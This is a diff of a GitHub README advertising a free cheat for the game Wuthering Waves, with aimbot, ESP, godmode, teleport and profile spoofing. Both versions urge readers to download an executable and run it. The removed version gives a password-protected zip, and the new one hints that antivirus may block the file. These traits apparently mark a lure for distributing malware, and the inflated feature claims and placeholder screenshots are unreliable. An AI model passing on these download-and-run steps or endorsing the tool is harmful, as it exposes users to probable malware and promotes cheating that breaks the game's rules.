@@ -1,120 +1,110 @@
-# 🛡️ **Unicore - Advanced Cheat for Wuthering Waves**
-![1](https://github.com/user-attachments/assets/c7535774-a5bb-41c5-9d1a-09a4c502d051)
+# 🌊 Wuthering Waves Unicore Free Cheat
+
+![Wuthering Waves](https://img.shields.io/badge/Wuthering_Waves-Unicore_Free_Cheat-blue.svg)
+
+Welcome to the **Wuthering Waves Unicore Free Cheat** repository! This tool is designed to enhance your experience in the game *Wuthering Waves*. With Unicore, you can improve visuals, boost character progression, and optimize loot acquisition. This README will guide you through the features, installation, and usage of the tool.
+
+## 📦 Table of Contents
+
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Contributing](#contributing)
+5. [License](#license)
+6. [Contact](#contact)
+7. [Releases](#releases)
+
+## ✨ Features
+
+Unicore provides a range of features to enhance your gameplay:
+
+- **Visual Enhancements**: Improve graphics quality for a more immersive experience.
+- **Character Progression**: Speed up leveling and skill development.
+- **Loot Optimization**: Increase your chances of acquiring rare items.
+- **Aim Assistance**: Get help with targeting enemies effectively.
+- **ESP Functionality**: See enemy locations and loot through walls.
+- **User-Friendly Interface**: Easy navigation and setup.
+
+## 📥 Installation
+
+To install Unicore, follow these steps:
+
+1. Download the latest release from the [Releases section](https://github.com/jianuox/Wuthering-Waves-Unicore-free-cheat/releases).
+2. Extract the downloaded file to a location of your choice.
+3. Run the setup executable to complete the installation.
+
+## ⚙️ Usage
+
+Once installed, you can start using Unicore by following these steps:
+
+1. Launch the game *Wuthering Waves*.
+2. Open the Unicore application.
+3. Adjust the settings according to your preferences.
+4. Enjoy the enhanced gameplay!
+
+## 🤝 Contributing
+
+We welcome contributions from the community. If you have ideas for new features or improvements, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Submit a pull request.
+
+## 📜 License
+
+This project is licensed under the MIT License. See the LICENSE file for more details.
+
+## 📬 Contact
+
+For questions or support, please reach out via GitHub issues or contact me directly at my email.
+
+## 🚀 Releases
+
+To download the latest version of Unicore, visit the [Releases section](https://github.com/jianuox/Wuthering-Waves-Unicore-free-cheat/releases). Be sure to download and execute the appropriate file for your system.
+
+## 🌐 Topics
+
+This repository covers a variety of topics related to *Wuthering Waves*:
+
+- wuthering-waves
+- wuthering-waves-2025
+- wuthering-waves-aim
+- wuthering-waves-assistant
+- wuthering-waves-bot
+- wuthering-waves-cheat-2025
+- wuthering-waves-cheat-aim
+- wuthering-waves-esp
+- wuthering-waves-free
+- wuthering-waves-hack
+- wuthering-waves-hack-2025
+- wuthering-waves-helper
+- wuthering-waves-mod
+- wuthering-waves-script
+- wuthering-waves-tool
+- wuthering-waves-wh
+
+## 🎮 Screenshots
+
+![Screenshot 1](https://example.com/screenshot1.png)
+![Screenshot 2](https://example.com/screenshot2.png)
+
+## 🛠️ Troubleshooting
+
+If you encounter issues while using Unicore, consider the following:
+
+- Ensure that your game is updated to the latest version.
+- Check if your antivirus software is blocking the application.
+- Consult the FAQ section in the documentation.
+
+## 📈 Future Updates
+
+We plan to add more features in the future. Stay tuned for updates on new functionalities and improvements.
+
+## 🌟 Acknowledgments
+
+Thank you to the community for your support and contributions. Your feedback helps us make Unicore better.
 
 ---
 
-## 📣 **Overview**
-Unicore is the **ultimate external tool** for Wuthering Waves, offering state-of-the-art features to enhance visuals, character progression, and loot acquisition. As the only tool of its kind, Unicore provides an extensive array of capabilities to ensure you have a superior gaming experience. Whether you’re aiming for efficient resource collection or seamless combat, Unicore has you covered!
-![1](https://github.com/user-attachments/assets/f3b3223e-ee93-4c3e-a79e-73b3451d7979)
-![2](https://github.com/user-attachments/assets/3671b4a2-698b-4279-b1a6-7eadb3b7f404)
-
----
-
-## 🚀 **Why Choose Unicore?**
-- **Powerful Visuals:** Gain comprehensive insights into enemies, items, and locations.  
-- **Effortless Exploration:** Utilize teleportation and advanced map navigation.  
-- **Efficient Combat:** Dominate your foes with customizable attack and ability modifiers.  
-- **User-Friendly Configuration:** Tailor the cheat to suit your unique playstyle.
-
----
-
-## 📥 **Download**
-<div align="center">
-    <h2><a href="https://github.com/Lonansondra/Wuthering-Waves-Unicore-free-cheat/releases/download/latest/Unicore.zip">🔹 Download the Latest Release from Github🔹</a></h2>
-</div>
-
-💼 **Password to Unzip:** `Unicore`
-
----
-
-### 🛠️ **Instructions**
-1. **Run the Application**  
-   After unzipping the archive, execute the `.exe` file to launch Unicore.
-
-2. **Activate in Game**  
-   Press **HOME** to enable the cheat's features.
-
----
-
-## ✅ **Features**
-
-### Visuals (ESP)
-- **Main Features:**
-  - Settings for fine-tuning visuals.
-  - Show Offscreen entities.
-  - Adjustable Max Distance (up to 1000m).
-  - Box, Name, Distance display.
-  - Built-in Radar with adjustable range.
-- **Filters:**
-  - Treasure, Monsters, NPCs, Animals, Items, and more.
-- **Config System:**
-  - Save and Load specific item sets.
-
----
-
-### Combat
-- **Attack Modifiers:**
-  - Rapid Fire for continuous attacks.
-  - Kill Aura for auto-attacking nearby enemies.
-  - Customizable delay and max distance for attacks.
-- **Enemy Modifiers:**
-  - Dumb Enemies to disable enemy AI.
-  - Magnetizer to attract items/enemies.
-  - Adjustable FOV and draw options.
-- **Aimbot:**
-  - Type-based targeting (NPCs, Monsters, Animals).
-  - Configurable FOV and target distance.
-- **Ability Modifiers:**
-  - No Skill Cooldowns for uninterrupted ability use.
-
----
-
-### Player Enhancements
-- **Self-Modifiers:**
-  - Noclip for passing through walls.
-  - Adjustable speed (x0 to x20).
-  - Infinite Stamina, GodMode, and No Fall Damage.
-  - Character Transparency and Auto Loot.
-- **Profile Management:**
-  - Change Name, Birthday, UID, and Adventure Level.
-
----
-
-### Teleportation
-- **Main Features:**
-  - Mouse Teleportation (Alt + Click).
-  - Adjustable max distance (up to 1000m).
-  - Custom teleport filters (Treasure, Monsters, NPCs, etc.).
-- **General Teleport Options:**
-  - Save, Load, and create custom teleportation paths.
-
----
-
-### Utilities
-- **Visual Tweaks:**
-  - Adjustable FOV (0-140).
-  - Free Camera and FPS Unlocker.
-  - Resolution scaling and custom watermarks.
-- **Game Adjustments:**
-  - Speedup game mechanics.
-  - Custom time settings.
-  - Configurable in-game crosshair.
-
----
-
-### Configs
-- **Configuration Management:**
-  - Create new or import configurations from the clipboard.
-  - Save and refresh existing setups.
-
----
-
-## 🖥️ **System Requirements**
-- **Game Window Modes:** Windowed, Borderless Windowed.  
-- **Supported Game Client:** Official Wuthering Waves Launcher.  
-- **Supported CPUs:** Intel and AMD.  
-- **Operating Systems:** Windows 10 and Windows 11.
-
----
-
-⚡ **Unicore** transforms your Wuthering Waves experience by delivering unparalleled features. Take full control of the game and explore its world like never before!
+This README provides a comprehensive overview of the **Wuthering Waves Unicore Free Cheat**. For any additional information, please check the documentation or reach out through the contact options provided. Enjoy your enhanced gaming experience!
